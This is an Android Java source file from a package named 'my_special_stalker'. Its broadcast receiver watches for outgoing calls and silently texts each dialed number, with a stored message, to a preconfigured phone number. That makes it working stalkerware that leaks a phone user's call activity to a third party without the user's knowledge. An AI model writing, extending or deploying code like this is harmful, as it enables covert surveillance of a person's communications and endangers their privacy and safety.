package com.example.my_special_stalker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.telephony.SmsManager;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import java.lang.reflect.Type;


public class CallReciver extends BroadcastReceiver {
    Gson gson = new Gson();

    Info_entered info ;
    SharedPreferences sp;


    @Override
    public void onReceive(Context context, Intent intent) {
        sp = context.getSharedPreferences("saved_info_in_brodcast",Context.MODE_PRIVATE);
        String action = intent.getAction();
        loadSP();
        if(action.equals("updated_info")){

            Gson g=new Gson();
            Type type=new TypeToken<Info_entered>(){}.getType();
            info = new Info_entered();
            String state2 = intent.getExtras().getString("extra");
            info = g.fromJson(state2,type);
            saveSP();
        }


        if (action.equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
                // this is an outgoing call:
                String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                if(info!=null && !info.getPhone_number().isEmpty()) {
                    SmsManager.getDefault().sendTextMessage(info.getPhone_number(),
                            null, info.getMsg_to_send() + " " + number,
                            null, null);
                }
        }


    }



    public void saveSP(){
        //save preferences:
        SharedPreferences.Editor editor = sp.edit();
        String json = gson.toJson(info);
        editor.putString("saved_info_in_brodcast",json);
        editor.apply();
    }

    public  void  loadSP(){
        //load info:
        String jsonLoad =sp.getString("saved_info_in_brodcast",null);
        Type type = new TypeToken<Info_entered>(){}.getType();
        info = gson.fromJson(jsonLoad,type);
        if (info == null) {
            info = new Info_entered();

        }
    }


}
